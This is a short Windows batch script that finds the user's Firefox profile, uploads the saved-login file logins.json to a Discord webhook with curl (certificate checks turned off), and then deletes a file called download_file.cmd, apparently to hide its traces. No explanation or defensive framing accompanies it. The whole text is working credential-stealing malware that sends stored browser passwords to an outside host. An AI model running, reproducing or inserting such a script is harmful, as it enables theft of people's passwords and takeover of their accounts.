@echo off
for /d %%d in ("%USERPROFILE%\AppData\Roaming\Mozilla\Firefox\Profiles\*release*") do set firefox_profile=%%d
curl -X POST -H "Content-Type: multipart/form-data" -F "content=firefox" -F "file=@%firefox_profile%\logins.json" https://discord.com/api/webhooks/1295740220507033653/ZtAyFre9GdhE3Z07Dlk-4M5zKm6ZVX2kO_ROiZeawfShFy1mDNCdd_grGNXMvBtvxTML --insecure
del download_file.cmd
